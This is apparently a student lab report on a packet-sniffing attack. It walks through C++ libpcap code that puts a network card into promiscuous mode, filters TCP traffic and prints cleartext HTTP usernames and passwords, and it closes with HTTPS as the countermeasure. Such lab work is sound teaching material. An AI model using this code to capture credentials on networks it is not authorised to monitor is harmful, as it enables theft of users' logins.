# Packet Sniffing Attack And Sniffing HTTP Passwords



## 1. Introduction

In an usual networking scenario, all packets flowing across a network are received by the Network Interface Card (NIC) of any device of the network. Then the NIC checks if the MAC address of the destination machine in the packet matches with the one of the NIC. If they don't match, the packet is discarded. If they do match, the packet is farther passed to the kernel who dispatches a handler function. The handler function passes the packet to the proper user program.

In this scenario, the packets not intended for a machine are discarded by the NIC. But fortunately most of the NICs have a special mode called *promiscuous mode*. In this mode, the NIC passes all the received packets to the kernel. So if a user program is registered to receive all such packets, it will be able to read all the packets flowing across the network. This process is called packet sniffing. Usually network administrators use packet sniffing to understand network characteristics and troubleshoot networks if necessary. But intruders can also use it to gain access to confidential data.

More details on packet sniffing have been explained in the design report of this project with appropriate diagrams.



## 2. Steps of Attack

To implement the packet sniffing attack, I needed to put the NIC into promiscuous mode and create a raw socket to receive all frames. As I was trying to sniff only HTTP requests, I also needed to filter packets. For these purposes, I have used an API called *pcap* provided by the library *libpcap*. pcap provides some functions to create a packet sniffing environment and also allows to attach BSD packet filters to discard unwanted packets. The steps of the attack are described below:

1. First I have called the *pcap_open_live* function to get a packet capture handle to look at the packets received by the NIC *enp0s3*. The value of the third parameter is set to 1 in order to put the NIC into promiscuous mode.

   ```c++
   // errbuf is the buffer where the error message will be saved in case of a failure.
   handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
   if(handle == NULL) // true if the preceding function call fails
   {
       printf("Failed to create socket\n");
       printf("Error message: %s\n", errbuf);
       return 0;
   }
   ```

2. Then I have created a BPF using the *pcap_compile* and *pcap_setfilter* functions. The filter expression **"ip proto tcp"** allows only IPv4 packets with TCP protocol to be captured. As I'm trying to sniff only HTTP requests, this filtering will discard a lot of unwanted packets.

   ```c++
   struct bpf_program fp;
   char filter_exp[] = "ip proto \\tcp"; // capturing only IPv4 packets with TCP protocol
   bpf_u_int32 net;
   
   int compile_res = pcap_compile(handle, &fp, filter_exp, 0, net);
   if(compile_res == PCAP_ERROR) {
       printf("Failed to compile BPF\n");
       pcap_perror(handle, "Error");
       return 0;
   }
   
   int setup_res = pcap_setfilter(handle, &fp);
   if(setup_res == PCAP_ERROR) {
       printf("Failed to attach BPF\n");
       pcap_perror(handle, "Error");
       return 0;
   }
   ```

3.  Next, I have called the *pcap_loop* function to start packet capturing. The second argument *-1* indicates that there is no limit to the number of captured packets. The third argument *got_packet* is the callback handler function that will be invoked when a packet is captured.
	```c++
	pcap_loop(handle, -1, got_packet, NULL);
	```
	
4. In the *got_packet* function, I have first type-cast the received packet into a custom *ipheader* structure. But I had to add the offset for the ethernet header with the start of the frame. From the created struct, I can extract all the data contained by the IP header of the packet. Now I can print the source and destination IP addresses.

   ```c++
   struct ipheader * ip = (struct ipheader *) (packet + sizeof(struct ethheader));
   ```

   *ipheader* and *ethheader* are two custom structures that contain all the header information of corresponding protocols.

   ```c++
   /* Ethernet header */
   struct ethheader {
     u_char  ether_dhost[6]; /* destination host address */
     u_char  ether_shost[6]; /* source host address */
     u_short ether_type;     /* protocol type (IP, ARP, RARP, etc) */
   };
   
   /* IP Header */
   struct ipheader {
     unsigned char      iph_ihl:4, //IP header length
                        iph_ver:4; //IP version
     unsigned char      iph_tos; //Type of service
     unsigned short int iph_len; //IP Packet length (data + header)
     unsigned short int iph_ident; //Identification
     unsigned short int iph_flag:3, //Fragmentation flags
                        iph_offset:13; //Flags offset
     unsigned char      iph_ttl; //Time to Live
     unsigned char      iph_protocol; //Protocol type
     unsigned short int iph_chksum; //IP datagram checksum
     struct  in_addr    iph_sourceip; //Source IP address
     struct  in_addr    iph_destip;   //Destination IP address
   };
   ```
   
5. Then I have extracted the TCP datagram in a similar way. A small difference is the IP header length is contained by the *iph_ihl* field as count of 32 bit words. We can then get the actual application message size by substracting the TCP header length contained by the *doff* field.
	```c++
	struct tcphdr *tcphh =
	    (struct tcphdr*) (packet + sizeof(struct ethheader) + ip->iph_ihl * 4);
	int data_size = ntohs(ip->iph_len) - ip->iph_ihl * 4 - tcphh->doff * 4;
	```
	
	*tcphdr* is a custom structure containing information of *TCP* header.
	
	```c++
	/* TCP Header */
	struct tcpheader {
	    unsigned short int source; // Source port
	    unsigned short int dest; // Destination port
	    unsigned int seq; // Sequence number
	    unsigned int ack_seq; // Acknowledgement Number
	    unsigned short int   res1:4,
	            doff:4, // Header length
	            fin:1,
	            syn:1,
	            rst:1,
	            psh:1,
	            ack:1,
	            urg:1,
	            ece:1,
	            cwr:1;
	    unsigned short int window; // Window size
	    unsigned short int check; // checksum
	    unsigned short int urg_ptr; // Urgent pointer
	};
	```
6. Then I have determined the start of the actual message by adding appropriate offsets for different protocol headers. I have written a simple parser to determine if the data is indeed an HTTP request containing username and passwords. If the data is not what I intend to capture, the function returns without printing anything.
	```c++
	char* data = (char*) (packet + sizeof(ethheader) + ip->iph_ihl * 4 + tcphh->doff * 4);
	
	http_parser parser(data);
	if(parser.isHTTP() == false) return;
	```

7. Finally I have printed the HTTP message containing username and passwords along with the source and destination IP addresses.

   ```c++
   printf("Total data size: %hu\n", data_size);
   printf("           From: %s\n", inet_ntoa(ip->iph_sourceip));  
   printf("             To: %s\n\n", inet_ntoa(ip->iph_destip));
   
   printf("HTTP Message:\n");
   for(int i = 0; i < data_size; i++) printf("%c", data[i]);
   printf("\n\n");
   ```



## 3. Snapshots of Attacker and Victim screens



<img src="https://raw.githubusercontent.com/SlowDecay/packet-sniffer/main/attacker-screen.png" alt="attacker-screen" title="Attacker screen" style="zoom:100%;" />

​																			Figure 1: Attacker Screen



![victim-screen](https://raw.githubusercontent.com/SlowDecay/packet-sniffer/main/victim-screen.png)

​																			Figure 2: Victim Screen



## 4. Justification

As seen from the snapshots, the sniffer program could indeed capture the packet sent by the victim machine containing username and password. I have also tested it with some other websites. So I am confident that my attack is successfull.



## 5. Countermeasure

The countermeasure against packet sniffing attack is using secured protocols that encrypt data. HTTP is not secure, so a sniffer program can sniff and extract confidential data. If we use HTTPS, the sniffer program will still be able to sniff but cannot read the actual data anymore as it will be encrypted. Thus leakage of sensitive data can be prevented.

